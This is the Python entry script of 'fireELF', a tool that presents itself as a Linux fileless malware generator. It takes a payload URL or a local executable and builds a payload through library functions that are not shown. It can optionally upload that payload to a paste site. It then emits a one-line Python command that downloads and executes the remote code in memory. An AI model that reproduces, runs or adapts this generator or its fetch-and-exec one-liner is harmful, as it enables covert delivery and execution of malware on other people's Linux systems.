#!/usr/bin/env python3
import argparse
import sys

from lib.settings import *
from lib.generator import *
from lib.misc import *



class main(object):
    def parse_args(self, args):
        parser = argparse.ArgumentParser(description='fireELF, Linux Fileless Malware Generator')
        parser.add_argument('-s', action="store_true", dest="is_supress_banner", help="Supress Banner", default=False)
        parser.add_argument('-p', action="store", dest="payload_name", help="Name of Payload to Use")
        parser.add_argument('-w', action="store", dest="payload_filename", help="Name of File to Write Payload to (Highly Recommended if You're not Using the Paste Site Option)")
        payload = parser.add_mutually_exclusive_group(required=True)
        payload.add_argument('-u', action="store", dest="payload_url", help="Url of Payload to be Executed")
        payload.add_argument('-e', action="store", dest="executable_path", help="Location of Executable")
        return parser.parse_args(args)

    def start(self, args):
        options = self.parse_args(args)
        if not options.is_supress_banner:
            banner()
        payload_to_use = ((options.payload_url, True), (open(options.executable_path, "rb").read(), False))[bool(options.executable_path)]
        payload = generate(payload_to_use[0], payload_to_use[1], PAYLOAD_DIR, options.payload_name)
        if payload:
            print_info("Successfully Created Payload.", "+")
            reduce_size = input("Miniaturize by Removing New Line Characters? (y/N) ").lower()
            if reduce_size == "y":
                payload = miniaturize_payload(payload)
            upload_payload = input("Upload the Payload to Paste site? (y/N) ").lower()
            if upload_payload == "y":
                url = paste_site_upload(payload)
                if url:
                    payload = "python -c \"import urllib2;exec(urllib2.urlopen('{}').read())\"".format(url)
                    if len(payload) < 150:
                        print_payload = input("Generated and Uploaded Payload is Below 150 Characters in Length, Print? (y/N) ").lower()
                        if print_payload == "y":
                            print("\n{}\n".format(payload))
            if options.payload_filename:
                with open(options.payload_filename, "w") as payload_file:
                    payload_file.write(payload)
                payload_file.close()
        print_info("Finished.", "!")
if __name__ == '__main__':
    entry = main()
    entry.start(sys.argv[1:])
